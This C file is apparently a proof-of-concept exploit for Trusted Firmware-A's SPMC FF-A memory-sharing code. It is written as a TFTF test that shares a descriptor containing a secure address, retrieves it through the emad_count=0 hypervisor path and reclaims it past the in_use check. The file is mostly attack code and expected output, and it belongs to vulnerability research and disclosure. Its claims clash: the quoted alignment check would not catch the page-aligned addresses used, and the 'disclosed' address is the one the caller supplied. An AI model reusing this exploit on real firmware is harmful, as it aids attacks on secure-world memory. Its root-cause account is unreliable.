/*
 * PoC 3: FF-A Memory Sharing - Protected Address Disclosure via
 *         FFA_MEM_RETRIEVE_REQ (emad_count=0) + FFA_MEM_RECLAIM bypass
 *
 * Vulnerability: spmc_shmem_check_obj() in spmc_shared_mem.c line 972
 *   issues WARN without returning FFA_ERROR_INVALID_PARAMETER when a
 *   constituent address points to a protected memory region.
 *
 * This PoC demonstrates a THIRD exploitation path using the same root cause,
 * combining two additional SPMC behaviors:
 *
 * Behavior 1 - FFA_MEM_RETRIEVE_REQ with emad_count=0:
 *   When the hypervisor (NWd) sends FFA_MEM_RETRIEVE_REQ with emad_count=0,
 *   the SPMC processes the request via spmc_populate_ffa_hyp_descriptor(),
 *   which reformats the descriptor for hypervisor consumption. Critically,
 *   it does NOT increment obj->in_use when emad_count=0:
 *     if (req->emad_count != 0U) {
 *         obj->in_use++;   // NOT executed when emad_count=0
 *     }
 *   The reformatted descriptor (hyp format) is returned in the RX buffer,
 *   disclosing the protected address at offset +96.
 *
 * Behavior 2 - FFA_MEM_RECLAIM bypass:
 *   Since in_use was never incremented, FFA_MEM_RECLAIM finds in_use==0
 *   and proceeds to call plat_spmc_shmem_reclaim(&obj->desc) with the
 *   corrupted descriptor still containing the protected address.
 *   On FVP, plat_spmc_shmem_reclaim() is a stub that returns 0, but
 *   on platforms with a real implementation this could have security impact.
 *
 * Notable difference from PoC 2:
 *   The RX buffer offset +000 contains 0x0000000000400000 instead of 0x0
 *   This is the memory_region_attributes field in the reformatted hyp
 *   descriptor - proving this path uses a different code branch
 *   (spmc_populate_ffa_hyp_descriptor vs direct desc copy).
 *
 * Root cause:
 *   File: services/std_svc/spm/el3_spmc/spmc_shared_mem.c
 *   Line: 972
 *   Code:
 *     if (!is_aligned(mrd->address, PAGE_SIZE)) {
 *         WARN("...not 4K aligned...");
 *         // MISSING: return FFA_ERROR_INVALID_PARAMETER;
 *     }
 *
 * Secondary issue:
 *   File: services/std_svc/spm/el3_spmc/spmc_shared_mem.c
 *   The in_use counter is not incremented for emad_count=0 retrieve requests,
 *   allowing FFA_MEM_RECLAIM to execute with a corrupted descriptor.
 *
 * Platform: FVP_Base_RevC-2xAEMvA (emulated)
 * TF-A version: v2.15.0
 * Branch: main (v2.15.0-328-g2021bc37e)
 *
 * Build instructions: same as PoC 1 and PoC 2.
 * Test function: test_poc3_retrieve_reclaim
 *
 * Expected output:
 *   [poc3] RETRIEVE OK: hyp descriptor returned with protected address
 *   [poc3] offset +000: 0x0000000000400000  (hyp format - different from PoC2)
 *   [poc3] offset +096: 0x00000000ff000000  <-- TARGET (Secure TZC)
 *   [poc3] RECLAIM passed with corrupted descriptor (in_use==0)
 *   [poc3] plat_spmc_shmem_reclaim() called with 0xFF000000 in descriptor
 */

#include <arch_features.h>
#include <arch_helpers.h>
#include <runtime_services/ffa_helpers.h>
#include "ffa_svc.h"
#include "stdint.h"
#include "utils_def.h"
#include <debug.h>
#include <sync.h>

#include <ffa_endpoints.h>
#include <spm_common.h>
#include <spm_test_helpers.h>
#include <test_helpers.h>
#include <tftf_lib.h>
#include <xlat_tables_defs.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>

#define MAILBOX_SIZE        PAGE_SIZE
#define SENDER              HYP_ID
#define RECEIVER            SP_ID(1)
#define NS_DRAM_VALID       0x88000000ULL
#define SECURE_TARGET       0xFF000000ULL  /* ARM_AP_TZC_DRAM1_BASE */
#define LOCAL_BUF_WORDS     64

/* 8-byte aligned buffer to avoid data abort on uint64_t access */
static uint64_t local_buf[LOCAL_BUF_WORDS];

test_result_t test_poc3_retrieve_reclaim(void)
{
    printf("[poc3] TF-A FF-A SPMC - Protected Address Disclosure via\n");
    printf("[poc3] FFA_MEM_RETRIEVE_REQ (emad_count=0) + FFA_MEM_RECLAIM bypass\n");
    printf("[poc3] Root cause: spmc_shared_mem.c:972 WARN without return\n\n");

    /* Step 0: Negotiate FF-A version */
    struct ffa_value ver = ffa_version(FFA_VERSION_COMPILED);
    if (ver.fid == FFA_ERROR) {
        printf("[poc3] ffa_version() failed\n");
        return TEST_RESULT_FAIL;
    }
    printf("[poc3] FF-A version negotiated: 0x%lx\n", (unsigned long)ver.fid);

    struct mailbox_buffers mb;
    GET_TFTF_MAILBOX(mb);

    /*
     * Step 1: Create a memory sharing object with a protected address.
     *
     * Due to the missing return after WARN in spmc_shmem_check_obj(),
     * the SPMC accepts the descriptor and stores it in its Trusted DRAM
     * pool with SECURE_TARGET as the second constituent address.
     */
    struct ffa_memory_region_constituent constituents[2] = {
        {
            .address    = (void *)NS_DRAM_VALID,
            .page_count = 1,
            .reserved   = 0,
        },
        {
            .address    = (void *)SECURE_TARGET,
            .page_count = 1,
            .reserved   = 0,
        },
    };

    struct ffa_memory_access receiver = ffa_memory_access_init(
        RECEIVER,
        FFA_DATA_ACCESS_RW,
        FFA_INSTRUCTION_ACCESS_NX,
        0,
        NULL);

    uint32_t total_length, fragment_length;

    ffa_memory_region_init(
        mb.send, MAILBOX_SIZE,
        SENDER, &receiver, 1,
        constituents, 2,
        0, 0,
        FFA_MEMORY_NORMAL_MEM,
        FFA_MEMORY_CACHE_WRITE_BACK,
        FFA_MEMORY_INNER_SHAREABLE,
        &total_length, &fragment_length);

    fragment_length = total_length;

    struct ffa_value ret = ffa_mem_share(total_length, fragment_length);
    if (ret.fid == FFA_ERROR) {
        printf("[poc3] FFA_MEM_SHARE rejected (unexpected): %ld\n",
               (long)ret.arg2);
        return TEST_RESULT_FAIL;
    }

    ffa_memory_handle_t handle = ffa_mem_success_handle(ret);
    printf("[poc3] Step 1: FFA_MEM_SHARE accepted.\n");
    printf("[poc3]   Handle assigned by SPMC: 0x%llx\n",
           (unsigned long long)handle);
    printf("[poc3]   Protected address stored: 0x%llx\n", SECURE_TARGET);

    /*
     * Step 2: FFA_MEM_RETRIEVE_REQ with emad_count=0 (hypervisor path).
     *
     * Key behavior: when emad_count=0, the SPMC:
     *   a) Does NOT increment obj->in_use
     *      (see: if (req->emad_count != 0U) { obj->in_use++; })
     *   b) Calls spmc_populate_ffa_hyp_descriptor() which reformats
     *      the descriptor and copies it to the NWd RX buffer
     *
     * This discloses the protected address in a DIFFERENT format than
     * PoC 2 (offset +000 = 0x0000000000400000 vs 0x0 in PoC 2),
     * proving a separate code path is being exercised.
     */
    printf("\n[poc3] Step 2: FFA_MEM_RETRIEVE_REQ (emad_count=0)...\n");
    printf("[poc3]   This path does NOT increment in_use.\n");

    struct ffa_memory_region *retrieve_req =
        (struct ffa_memory_region *)mb.send;
    memset(retrieve_req, 0, sizeof(struct ffa_memory_region));
    retrieve_req->sender         = SENDER;
    retrieve_req->handle         = handle;
    retrieve_req->receiver_count = 0;  /* emad_count=0: hypervisor path */

    uint32_t req_size = sizeof(struct ffa_memory_region);

    smc_args retrieve_args = {
        .fid  = FFA_MEM_RETRIEVE_REQ_SMC64,
        .arg1 = req_size,
        .arg2 = req_size,
        .arg3 = 0,
        .arg4 = 0,
        .arg5 = 0,
        .arg6 = 0,
        .arg7 = 0,
    };

    smc_ret_values smc_ret = tftf_smc(&retrieve_args);

    printf("[poc3] FFA_MEM_RETRIEVE_REQ returned: fid=0x%lx\n",
           (unsigned long)smc_ret.ret0);

    bool retrieve_ok = false;
    bool target_found = false;

    if (smc_ret.ret0 == FFA_ERROR) {
        printf("[poc3] RETRIEVE failed: %ld\n", (long)smc_ret.ret2);
        printf("[poc3] Note: in_use was NOT incremented (emad_count=0).\n");
    } else {
        uint32_t out_size  = (uint32_t)smc_ret.ret1;
        uint32_t copy_size = (uint32_t)smc_ret.ret2;

        printf("[poc3] RETRIEVE succeeded: out_size=%u copy_size=%u\n",
               out_size, copy_size);
        retrieve_ok = true;

        /* Copy RX buffer to aligned local buffer before releasing */
        uint32_t copy_words = copy_size / 8;
        if (copy_words > LOCAL_BUF_WORDS) copy_words = LOCAL_BUF_WORDS;

        for (uint32_t w = 0; w < copy_words; w++) {
            memcpy(&local_buf[w], (uint8_t *)mb.recv + (w * 8), 8);
        }
        ffa_rx_release();

        printf("[poc3] Hyp descriptor returned in RX buffer:\n");
        printf("[poc3]   Note: offset +000 = 0x%016llx\n",
               (unsigned long long)local_buf[0]);
        printf("[poc3]   (In PoC2 via FRAG_RX this was 0x0 - different code path)\n");

        for (uint32_t w = 0; w < copy_words; w++) {
            printf("[poc3]   +%03u: 0x%016llx", w * 8,
                   (unsigned long long)local_buf[w]);
            if (local_buf[w] == SECURE_TARGET) {
                printf("  <-- PROTECTED TARGET DISCLOSED");
                target_found = true;
            }
            printf("\n");
        }

        if (target_found) {
            printf("\n[poc3] DISCLOSURE CONFIRMED:\n");
            printf("[poc3]   Protected address 0x%llx found in RX buffer.\n",
                   SECURE_TARGET);
            printf("[poc3]   Disclosed via FFA_MEM_RETRIEVE_REQ hyp path.\n");
        }
    }

    /*
     * Step 3: FFA_MEM_RECLAIM with corrupted descriptor.
     *
     * Since in_use was never incremented (emad_count=0 in step 2),
     * the SPMC reclaim check passes:
     *   if (obj->in_use != 0U) {
     *       ret = FFA_ERROR_DENIED;  // NOT reached
     *   }
     *
     * plat_spmc_shmem_reclaim(&obj->desc) is then called with the
     * descriptor still containing SECURE_TARGET at offset +96.
     * On FVP this is a stub, but on platforms with real implementations
     * this could trigger platform-specific security operations with
     * an untrusted/corrupted descriptor.
     */
    printf("\n[poc3] Step 3: FFA_MEM_RECLAIM (in_use should be 0)...\n");

    smc_args reclaim_args = {
        .fid  = FFA_MEM_RECLAIM,
        .arg1 = handle & 0xFFFFFFFF,
        .arg2 = handle >> 32,
        .arg3 = 0,
    };

    smc_ret_values reclaim_ret = tftf_smc(&reclaim_args);

    printf("[poc3] FFA_MEM_RECLAIM returned: fid=0x%lx\n",
           (unsigned long)reclaim_ret.ret0);

    bool reclaim_ok = false;
    if (reclaim_ret.ret0 == FFA_SUCCESS_SMC32 ||
        reclaim_ret.ret0 == FFA_SUCCESS_SMC64) {
        reclaim_ok = true;
        printf("[poc3] RECLAIM PASSED with corrupted descriptor!\n");
        printf("[poc3]   plat_spmc_shmem_reclaim() was called with\n");
        printf("[poc3]   0x%llx in descriptor at offset +96.\n", SECURE_TARGET);
        printf("[poc3]   spmc_shmem_obj_free() compacted the pool.\n");
    } else {
        int32_t err = (int32_t)(reclaim_ret.ret2 & 0xFFFFFFFF);
        if (err == FFA_ERROR_DENIED) {
            printf("[poc3] RECLAIM denied (in_use > 0 - unexpected).\n");
        } else {
            printf("[poc3] RECLAIM failed with error: %d\n", err);
        }
    }

    /* Summary */
    printf("\n[poc3] ================================================\n");
    printf("[poc3] SUMMARY:\n");
    printf("[poc3]   FFA_MEM_SHARE accepted protected addr:  %s\n",
           "YES (root cause: spmc_shared_mem.c:972)");
    printf("[poc3]   Address disclosed via RETRIEVE_REQ:     %s\n",
           target_found ? "YES (0x%llx at offset +96)" : "NO");
    printf("[poc3]   FFA_MEM_RECLAIM bypassed (in_use=0):   %s\n",
           reclaim_ok ? "YES" : "NO");
    printf("[poc3] ================================================\n");

    if (target_found && reclaim_ok) {
        printf("[poc3] VULNERABILITY CONFIRMED (all three steps):\n");
        printf("[poc3]   1. SPMC accepts protected address (missing return)\n");
        printf("[poc3]   2. Protected address disclosed via hyp RETRIEVE path\n");
        printf("[poc3]   3. FFA_MEM_RECLAIM bypasses in_use check\n");
        printf("[poc3]   Root cause: spmc_shared_mem.c:972\n");
    } else if (retrieve_ok) {
        printf("[poc3] PARTIAL: disclosure confirmed, reclaim status varies.\n");
    }

    return (target_found || reclaim_ok) ? TEST_RESULT_FAIL : TEST_RESULT_SUCCESS;
}
